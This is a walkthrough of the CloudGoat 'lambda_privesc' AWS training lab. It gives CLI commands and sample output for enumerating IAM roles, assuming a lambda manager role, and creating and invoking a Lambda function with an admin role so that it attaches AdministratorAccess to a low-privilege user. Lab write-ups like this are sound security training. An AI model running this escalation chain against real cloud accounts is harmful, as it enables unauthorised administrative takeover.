# Lambda Privilege Escalation

## Goal
Achieve full administrator privileges through assuming a lambda role.

## Installation
```
./cloudgoat.py create lambda_privesc
```
## Assume Chris
1. Add the profile
```
aws configure --profile chris
Enter secret key, access key, region and output
```
2. Set the default role to avoid --profile
```
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
export AWS_PROFILE=chris
aws sts get-caller-identity
```

## Enumerate Roles
1. List Roles
```
aws iam list roles
{
    "Path": "/",
    "RoleName": "<role name>",
    "RoleId": "<role id>",
    "Arn": "arn:aws:iam::<account id>:role/<role name>",
    "CreateDate": "2023-04-20T22:59:53+00:00",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "",
                "Effect": "Allow",
                "Principal": {
                    "Service": "lambda.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
}
{
    "Path": "/",
    "RoleName": "<role name>",
    "RoleId": "<role id>",
    "Arn": "arn:aws:iam::<account id>:role/<role name>",
    "CreateDate": "2023-04-20T23:00:03+00:00",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "",
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::<account id>:user/<user name>"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
}
```
2. Identify permissions in role
```
aws iam list-attached-role-policies --role-name <lambda manager role name>

aws iam get-policy-version --policy-arn <policy arn> --output json --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "lambda:*",
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "lambdaManager"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-04-20T22:59:53+00:00"
    }
}
```
From the above permission, we can confirm that the manager is able to perform any lambda actions and a pass role can be put to the lambda function.

## Assume Lambda Manager Role
1. Assume the lambda manager role
```
aws sts assume-role --role-arn <manager role arn> --role-session-name manager --output json
```
2. Add the profile
```
aws configure --profile manager
nano ~/.aws/credentials
<Add aws_session_token={session token for manager}>
```
## Enumerate debug role permissions
1. Enumerate permissions
```
aws iam list-attached-role-policies --role-name <debug role name>
ATTACHEDPOLICIES        arn:aws:iam::aws:policy/AdministratorAccess     AdministratorAccess
```
Thus, we can create a lambda function passing the debug role with full administration access.

## Craft Lambda Function
1. Copy lambda.py and replace corresponding variables. The lambda function should add the administrator access permission to chris.
2. Zip the file 
3. Create the function
```
aws lambda create-function --function-name lambda_privilege_escalate --role <debug role arn> --runtime python3.9 --profile manager --handler lambda.lambda_handler --zip-file <path to lambda.py.zip>
```
4. Execute function
```
aws lambda invoke --function-name lambda_privilege_escalate output.txt --profile manager
```
5. Check Permissions for Chris
```
aws iam list-attached-user-policies --user-name <chris user name>
...
ATTACHEDPOLICIES        arn:aws:iam::aws:policy/AdministratorAccess     AdministratorAccess <- This policy is attached!
```


## Troubleshooting
### Destroy "chris-XX need to detach policies in order to be deleted"
Go into the IAM console of the account and remove administrator access. Access key is already deleted so the cli commands will not work.

## References 
https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/lambda_privesc/README.md